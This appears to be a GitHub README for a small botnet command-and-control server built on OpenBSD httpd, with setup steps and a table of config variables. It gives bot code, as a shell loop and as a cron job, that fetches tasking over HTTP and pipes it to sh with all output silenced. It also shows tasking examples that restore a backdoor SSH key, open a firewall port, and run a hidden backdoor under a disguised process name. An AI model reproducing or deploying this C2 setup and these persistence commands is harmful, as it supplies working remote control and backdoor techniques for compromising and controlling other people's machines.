[OpenBSD `httpd(8)`](https://man.openbsd.org/httpd.8) Botnet Controller
-----------------------------------------------------------------------------------
A cheesy botnet controller which uses
[OpenBSD's `httpd(8)`](https://man.openbsd.org/httpd.8) to do the
heavy lifting.

Meant to demonstrate what just a little code can do.

It consists of three parts:
1.  A shell script to watch `/var/www/logs/access.log` for the purposes of...
    1.  Noting when bots call back
    2.  Deleting picked-up tasking
2.  Another shell script to add a task for a bot
3.  This README, with [setup instructions](#Setup)

For legal use only.

Features
--------
- Fewer than 100 lines of code.
- Comms over HTTP(s).
- Integration with existing [`http.conf`](https://man.openbsd.org/httpd.conf.5) files.
- Deletion of tasks sent to bots.
- No command output which causes mental clutter.  Or any output at all.
- No new syntax to learn; everything is done with normal shell things.
- Possible but untested portability to HTTP servers on other OSs.
- [Tests](./t), and a very complex [Makefile](./Makefile) to run them.

Setup
-----
1.  Create a group for botnet operators.  Alternatively, don't and adjust the
    rest of the steps accordingly.
    ```sh
    doas groupadd botnet
    doas usermod -G botnet $(whoami)
    ```
    Logout and login so new group takes effect.  Use `id` to verify.  It should
    look something like
    ```
    uid=1000(you) gid=1000(you) groups=1000(you), 1001(botnet)
    ```
2.  Create a directory for storing and serving tasking
    ```sh
    doas mkdir -p /var/www/htdocs/httpd_botnet_controller
    doas chgrp botnet /var/www/htdocs/httpd_botnet_controller
    doas chmod g=rwx /var/www/htdocs/httpd_botnet_controller
    ```
    And make sure all went well by adding and removing a file.
    ```sh
    touch /var/www/htdocs/httpd_botnet_controller/test &&
    rm -v /var/www/htdocs/httpd_botnet_controller/test
    ```
3.  Add a line in whatever chunk of
    [`httpd.conf`](https://man.openbsd.org/httpd.conf.5) will serve
    up our new tasking directory to serve an empty file instead of the default
    404 page if there's no tasking.
    ```
   	location not found match "/(httpd_botnet_controller)/.*" {
		request rewrite "/%1/_empty"
	}
    ```
    With the default config (i.e. the one from `/etc/examples/httpd.conf`) this
    will probably be in a `server {}` block
4.  Make the empty file to serve.
    ```sh
    touch /var/www/htdocs/httpd_botnet_controller/_empty
    ```
5.  Clone this repository and start the controller going.  
    ```sh
    git clone https://github.com/magisterquis/httpd_botnet_controller.git
    cd httpd_botnet_controller
    make # To run tests, optional
    ./httpd_botnet_controller.sh
    ```
Everything's set up.  Head down to the [Bots](#Bots) section to get bots going.

Bots
----
Bot interactions are governed by the following principles.

1.  Each bot has its own ID consisting of letters, numebers, dots, and hyphens.
    Hostnames work pretty well.
2.  Tasking is retrieved via HTTP(S) requests to
    `/httpd_botnet_controller/$ID` which serve up files from 
    `/var/www/htdocs/httpd_botnet_controller/$ID`.  What the bot does with the
    tasking is the bot's own business.
3.  When `httpd(8)` logs that a bot has requested tasking, a file in
    `$HOME/bots` is touched and `/var/www/htdocs/httpd_botnet_controller/$ID`
    is deleted.  This is inherently racy; make sure bots don't request tasking
    too often.

### Bot Code

In practice, this works out to bots being a little script like
```sh
#!/bin/sh
SERVER=https://your_server
while :; do
    curl -s $SERVER/httpd_botnet_controller/$(hostname) | sh >/dev/null 2>&1 &
    sleep 600 
done
```
or maybe a cronjob like
```cron
~/10    *   *   *   *   curl -s $SERVER/httpd_botnet_controller/$(HOSTNAME) | sh >/dev/null 2>&1 &
```

Output is up to you.

### Bot List
IDs of bots which have called back are stored in `$HOME/bots`.  These can be
sorted and filtered and so on with the customary shell tools.

Tasking
-------
Tasking takes the form of files in `/var/www/htdocs/httpd_botnet_controller/`
with the name of the bots` IDs.

Instead of manually making files in `/var/www/htdocs/httpd_botnet_controller/`,
the script [`task_bot.sh`](./task_bot.sh) may be used.  It takes as its first
argument the ID for which to queue tasking and the remaining arguments are
appended to the tasking file as a single line.  If there's no other arguments
stdin is appended to the tasking file. 

This works out to something like either
```sh
./task_bot.sh bot_1 cat <~/.ssh/ak.bak >>~/.authorized_keys
```
to add back a backup backdoor key or
```sh
./task_bot.sh bot_2 <<_eof
bash <<<'
iptables -I INPUT -p tcp --dport 44444 -j ACCEPT
exec -a not_malware /root/.hidden_backdoor' >/dev/null 2>&1 &
_eof
```
to reopen a in the firewall and start expertly hidden malware.

Config
------
The following environment variables configure both scripts:

Name           | Default                          | Description
---------------|----------------------------------|------------
`CHECKIN_PATH` | `httpd_botnet_controller`        | URL Path used for checking-in, followed by `/$ID`
`HTTPDLOGFILE` | `/var/www/logs/access.log`       | `httpd(8)`'s logfile
`LAST_DIR`     | `$HOME/bots`                     | Directory in which bots' last check-ins are noted as empty files
`TAILFLAGS`    | `-f -n -0`                       | Flags used by [`tail(1)`](https://man.openbsd.org/tail.1) for watching `$HTTPDLOGFILE`
`TASKING_DIR`  | `/var/www/htdocs/$CHECKIN_PATH}` | Directory in which tasking lives
